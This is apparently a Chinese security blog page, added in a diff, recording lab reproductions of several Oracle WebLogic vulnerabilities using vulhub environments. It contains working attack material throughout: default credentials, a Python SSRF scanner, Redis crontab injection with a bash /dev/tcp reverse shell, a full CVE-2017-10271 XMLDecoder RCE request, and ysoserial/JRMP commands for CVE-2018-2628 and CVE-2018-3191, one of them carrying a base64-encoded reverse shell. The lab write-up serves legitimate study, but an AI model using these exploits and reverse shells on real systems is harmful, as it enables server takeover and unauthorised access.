@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          weblogic漏洞练习 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/09/weblogic漏洞练习/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#weblogic" title="weblogic">weblogic</a>
+                        
+                          <a class="tag" href="/tags/#练习记录" title="练习记录">练习记录</a>
+                        
+                    </div>
+                    <h1>weblogic漏洞练习</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-09-10
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="About-WebLogic"><a href="#About-WebLogic" class="headerlink" title="About WebLogic"></a>About WebLogic</h1><blockquote>
+<p><strong>WebLogic</strong>是美商Oracle的主要产品之一，系购并得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器，目前已推出到12c（12.1.1）版。而此产品也延伸出WebLogic Portal, WebLogic Integration等企业用的中间件（但目前Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE（Oracle Enterprise Pack for Eclipse）开发工具。</p>
+<pre><code>———— 引自 wikipedia
+</code></pre></blockquote>
+<p>类似于一个Tomcat Apche之类的webserver，但是拥有更多集成的开发、集成、部署和管理功能。</p>
+<p>常开放于7001/7002端口</p>
+<p>漏洞环境来自于vulhub  <a href="https://github.com/vulhub/vulhub/tree/master/weblogic" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic</a></p>
+<h1 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h1><p>访问<code>/console</code>会转跳到管理员的登录界面</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/1.png" alt></p>
+<p>这里提供了两种方法进行进入后台，一个是弱口令，还有就是配合任意文件读取破解密码</p>
+<p>弱口令的话没什么技巧可言，但也是实战中比较重要的一种方式，这里账号密码为</p>
+<ul>
+<li>账号：weblogic</li>
+<li>密码：Oracle@123</li>
+</ul>
+<p>配合任意文件读取的话这里提供了一个<code>http://your-ip:7001/hello/file.jsp?path=</code>任意文件读取点，需要读取两个文件（当前目录为<code>/root/Oracle/Middleware/user_projects/domains/base_domain</code>）</p>
+<p><code>./security/SerializedSystemIni.dat</code> 并将获取到的二进制字符保存到文件中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/2.png" alt></p>
+<p><code>./config/config.xml</code>获取到<code>node-manager-password-encrypted</code>这个字段下的值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/3.png" alt></p>
+<p>由于加密的算法是基于对称加密的，所以可以破解出原密码（工具在网上也不难找到</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/4.png" alt></p>
+<p>这样就可以顺利登录到网站后台了，然后就是部署一个包含自己马的war包（没有jsp马的我默默问大佬要了个马</p>
+<p>linux下可以直接用命令打包war包</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">jar</span> <span class="selector-tag">-cvf</span> <span class="selector-attr">[war包名]</span> <span class="selector-attr">[目录名]</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/5.png" alt></p>
+<p>然后部署war包</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/1.gif" alt></p>
+<p>访问<code>http://your-ip:7001/web/web/xxx.jsp</code>即可访问到上传的马</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/6.png" alt></p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>漏洞产生于<code>/uddiexplorer/SearchPublicRegistries.jsp</code>页面中，可以导致ssrf，用来攻击内网中一些redis和fastcgi之类的脆弱组件</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.85.133:7001/uddiexplorer/SearchPublicRegistries.jsp</span></span><br><span class="line">?rdoSearch=name</span><br><span class="line"><span class="variable">&amp;</span>txtSearchname=sdf</span><br><span class="line"><span class="variable">&amp;</span>txtSearchkey=</span><br><span class="line"><span class="variable">&amp;</span>txtSearchfor=</span><br><span class="line"><span class="variable">&amp;selfor</span>=Business+location</span><br><span class="line"><span class="variable">&amp;</span>btnSubmit=Search</span><br><span class="line"><span class="variable">&amp;operator</span>=http:<span class="comment">//localhost:7001</span></span><br></pre></td></tr></table></figure>
+<p>当http端口存活的时候就会显示404not found</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/7.png" alt></p>
+<p>随机访问一个端口则会显示could not connect</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/8.png" alt></p>
+<p>一个非http的协议则会返回<code>did not have a valid SOAP</code>，不存活的主机就是<code>No route to host</code></p>
+<p>访问redis服务时</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/9.png" alt></p>
+<p><strong>攻击内网redis</strong></p>
+<p>一个简单的内网扫扫描</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://192.168.85.133:7001/uddiexplorer/SearchPublicRegistries.jsp"</span></span><br><span class="line"></span><br><span class="line">ports = [<span class="number">6378</span>,<span class="number">6379</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">80</span>,<span class="number">8080</span>,<span class="number">8888</span>,<span class="number">8000</span>, <span class="number">7001</span>, <span class="number">7002</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">		params = dict(</span><br><span class="line">			rdoSearch = <span class="string">"name"</span>,</span><br><span class="line">			txtSearchname = <span class="string">"sdf"</span>,</span><br><span class="line">			selfor = <span class="string">"Business+location"</span>,</span><br><span class="line">			btnSubmit = <span class="string">"Search"</span>,</span><br><span class="line">			operator = <span class="string">"http://172.23.0.&#123;&#125;:&#123;&#125;"</span>.format(i,port))</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			r = requests.get(url, params=params, timeout = <span class="number">3</span>)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">		<span class="keyword">if</span> <span class="string">'could not connect over HTTP to server'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> <span class="string">'No route to host'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(<span class="string">'[*] http://172.23.0.&#123;&#125;:&#123;&#125;'</span>.format(i,port))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">pass</span><span class="comment">#print('[-] http://172.23.0.&#123;&#125;:&#123;&#125;'.format(i,port))</span></span><br></pre></td></tr></table></figure>
+<p>扫描结果</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">*</span>] http:<span class="comment">//172.23.0.1:80</span></span><br><span class="line">[<span class="meta">*</span>] http:<span class="comment">//172.23.0.1:7001</span></span><br><span class="line">[<span class="meta">*</span>] http:<span class="comment">//172.23.0.2:6379</span></span><br><span class="line">[<span class="meta">*</span>] http:<span class="comment">//172.23.0.3:7001</span></span><br></pre></td></tr></table></figure>
+<p>172.23.0.1是我本地虚拟机，就可以忽略，6379就是很熟悉的redis了</p>
+<p>写如定时命令，详细攻击redis可以参考下 <a href="https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</a></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> 1 <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.23.0.1/21 0&gt;&amp;1\n\n\n\n"</span></span><br><span class="line">config <span class="builtin-name">set</span> dir /etc/</span><br><span class="line">config <span class="builtin-name">set</span> dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>转换成url格式，然后传输</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">85.133</span>:<span class="number">7001</span>//uddiexplorer/SearchPublicRegistries.jsp?operator=http://<span class="number">172.23</span>.<span class="number">0</span>.<span class="number">2</span>:<span class="number">6379</span>/test<span class="meta">%0D</span><span class="meta">%0A</span><span class="meta">%0D</span><span class="meta">%0Aset</span><span class="meta">%201</span><span class="meta">%20</span><span class="meta">%22</span><span class="meta">%5Cn</span><span class="meta">%5Cn</span><span class="meta">%5Cn</span><span class="meta">%5Cn</span>*<span class="meta">%20</span>*<span class="meta">%20</span>*<span class="meta">%20</span>*<span class="meta">%20</span>*<span class="meta">%20root</span><span class="meta">%20bash</span><span class="meta">%20-i</span><span class="meta">%20</span>&gt;<span class="meta">%26</span><span class="meta">%20</span><span class="meta">%2Fdev</span><span class="meta">%2Ftcp</span><span class="meta">%2F172</span>.<span class="number">23.0</span>.<span class="number">1</span><span class="meta">%2F1234</span><span class="meta">%200</span>&gt;<span class="meta">%261</span><span class="meta">%5Cn</span><span class="meta">%5Cn</span><span class="meta">%5Cn</span><span class="meta">%5Cn</span><span class="meta">%22</span><span class="meta">%0D</span><span class="meta">%0Aconfig</span><span class="meta">%20set</span><span class="meta">%20dir</span><span class="meta">%20</span><span class="meta">%2Fetc</span><span class="meta">%2F</span><span class="meta">%0D</span><span class="meta">%0Aconfig</span><span class="meta">%20set</span><span class="meta">%20dbfilename</span><span class="meta">%20crontab</span><span class="meta">%0D</span><span class="meta">%0Asave</span><span class="meta">%0D</span><span class="meta">%0A</span><span class="meta">%0D</span><span class="meta">%0Aaaa</span>&amp;rdoSearch<span class="built_in">=name</span>&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+<p>在虚拟机中用nc监听端口</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p <span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<p>过一会就能看到反弹回来的shell</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/10.png" alt></p>
+<p>业务无需UUDI功能时建议将其关闭</p>
+<h1 id="反序列化-CVE-2017-10271"><a href="#反序列化-CVE-2017-10271" class="headerlink" title="反序列化 CVE-2017-10271"></a>反序列化 CVE-2017-10271</h1><blockquote>
+<p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
+</blockquote>
+<p>漏洞发生在<code>/wls-wsat/CoordinatorPortType</code>页面中，它会将传入的xml语句进行解析、然后反序列化，造成任意代码执行</p>
+<p>构造如下的http包，在<code>&lt;string&gt;sub&lt;/string&gt;</code>中传入所需的命令即可命令执行</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.85.133:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 544</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line">&lt;string&gt;sub&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>我这由于是在虚拟机中搭建的，就弹了个sublime框</p>
+<p>需要注意的是<code>Content-Type</code>要设置成<code>text/xml</code>否则不会解析xml</p>
+<h1 id="反序列化-CVE-2018-2628"><a href="#反序列化-CVE-2018-2628" class="headerlink" title="反序列化 CVE-2018-2628"></a>反序列化 CVE-2018-2628</h1><p>首先需要一个ysoserial</p>
+<p><a href="https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar" target="_blank" rel="noopener">https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</a></p>
+<p>启动一个JRMP Server，[listen port] 为监听的端口    [ommand]为想要执行的命令</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span> <span class="selector-tag">-cp</span> <span class="selector-tag">ysoserial-0</span><span class="selector-class">.0</span><span class="selector-class">.6-SNAPSHOT-BETA-all</span><span class="selector-class">.jar</span> <span class="selector-tag">ysoserial</span><span class="selector-class">.exploit</span><span class="selector-class">.JRMPListener</span> <span class="selector-attr">[listen port]</span> <span class="selector-tag">CommonsCollections1</span> <span class="selector-attr">[command]</span></span><br></pre></td></tr></table></figure>
+<p>如我这为</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial<span class="number">-0.0</span><span class="number">.6</span>-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener <span class="number">23333</span> CommonsCollections1 '<span class="section">touch</span> /tmp/evil'</span><br></pre></td></tr></table></figure>
+<p>运行<a href="https://github.com/kingkaki/Exploit-scripts/blob/master/weblogic/CVE-2018-2628.py" target="_blank" rel="noopener">exp</a></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-attr">[victim ip]</span> <span class="selector-attr">[victim port]</span> <span class="selector-attr">[path to ysoserial]</span> <span class="selector-attr">[JRMPListener ip]</span> <span class="selector-attr">[JRMPListener port]</span> <span class="selector-attr">[JRMPClient]</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>[victim ip]： weblogic ip</li>
+<li>[victim port]：weblogic 端口</li>
+<li>[path to ysoserial]：ysoserial地址</li>
+<li>[JRMPListener ip]：JRMP Server的ip</li>
+<li>[JRMPListener port]：JRMP Server的端口</li>
+<li>[JRMPClient]：有JRMPClient<code>或</code>JRMPClient2两个选项</li>
+</ul>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="number">44553.</span>py <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">7001</span> ysoserial<span class="number">-0.0</span><span class="number">.6</span>-SNAPSHOT-BETA-all.jar <span class="number">192.168</span><span class="number">.85</span><span class="number">.133</span> <span class="number">23333</span> JRMPClient</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/2.gif" alt></p>
+<p>然后进入虚拟机内部之后，就可看到tmp目录下生成的evil文件</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/11.png" alt></p>
+<p>复现的时候有几个小问题，JRMP Server的ip需要填本地主网卡（用于上网的那个）的ip</p>
+<p>然后在物理机上攻击虚拟机中映射出来的docker环境不知道为什么没有成功</p>
+<p>以及自己在虚拟机上搭建的weblogic10.3.6貌似也没有成功。。</p>
+<h1 id="任意文件上传-CVE-2018-2894"><a href="#任意文件上传-CVE-2018-2894" class="headerlink" title="任意文件上传 CVE-2018-2894"></a>任意文件上传 CVE-2018-2894</h1><p>访问<code>/ws_utc/config.do</code>页面可以设置工作目录，将其设置为</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/u01/</span>oracle<span class="regexp">/user_projects/</span>domains<span class="regexp">/base_domain/</span>servers<span class="regexp">/AdminServer/</span>tmp<span class="regexp">/_WL_internal/</span>com.oracle.webservices.wls.ws-testclient-app-wls<span class="regexp">/4mcj4y/</span>war<span class="regexp">/css</span></span><br></pre></td></tr></table></figure>
+<p>然后在安全-&gt;添加处上传一个小马</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/13.png" alt></p>
+<p>在返回的数据包中有文件的id值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/12.png" alt></p>
+<p>然后访问<code>/ws_utc/css/config/keystore/[id]_[filename]</code>即可访问到文件</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/14.png" alt></p>
+<p>这个漏洞有个限制条件就是需要在<code>开发模式</code>下进行，否生产模式时需要进行认证登录</p>
+<h1 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h1><p>更新于2018/10/31</p>
+<p>听说最近又出了一个危害比较大的漏洞，遂复现了一下。和之前一样，需要weblogic开启T3协议</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -v -Pn -sV <span class="number">192.168</span><span class="number">.85</span><span class="number">.144</span> --script=weblogic-t3-info.nse</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018SECCON-ghostkingdom/9.jpg" alt></p>
+<p>需要一些准备的工具，具体可看这里<a href="https://github.com/jas502n/CVE-2018-3191" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2018-3191</a></p>
+<p>需要先生成一个payload</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar weblogic-spring-jndi-<span class="number">10.3.6.0</span>.jar rmi://攻击机ip:端口/exp &gt; payload</span><br></pre></td></tr></table></figure>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar weblogic-spring-jndi-<span class="number">10.3.6.0</span>.jar rmi://172.20.0.1:8888/exp &gt; payload</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/16.png" alt></p>
+<p>开启一个rmi服务</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span> <span class="selector-tag">-cp</span> <span class="selector-tag">ysoserial-0</span><span class="selector-class">.0</span><span class="selector-class">.6-SNAPSHOT-BETA-all</span><span class="selector-class">.jar</span> <span class="selector-tag">ysoserial</span><span class="selector-class">.exploit</span><span class="selector-class">.JRMPListener</span> 端口 <span class="selector-tag">CommonsCollections1</span> "要执行的指令"</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial<span class="number">-0.0</span><span class="number">.6</span>-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener <span class="number">8888</span> Commonollections1 <span class="string">"bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvMTcyLjIwLjAuMS83Nzc3IDA8JjEgMj4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span></span><br></pre></td></tr></table></figure>
+<p>这里将shell弹到了本地的7777端口，用nc监听一下</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp <span class="number">7777</span></span><br></pre></td></tr></table></figure>
+<p>发送攻击流量</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">weblogic</span><span class="selector-class">.py</span> 172<span class="selector-class">.20</span><span class="selector-class">.0</span><span class="selector-class">.2</span> 7001 <span class="selector-tag">payload</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/17.png" alt></p>
+<p>同时rmi服务会接受到<code>172.20.0.2</code>的流量</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/18.png" alt></p>
+<p>成功getshell</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/weblogic漏洞练习/19.png" alt></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
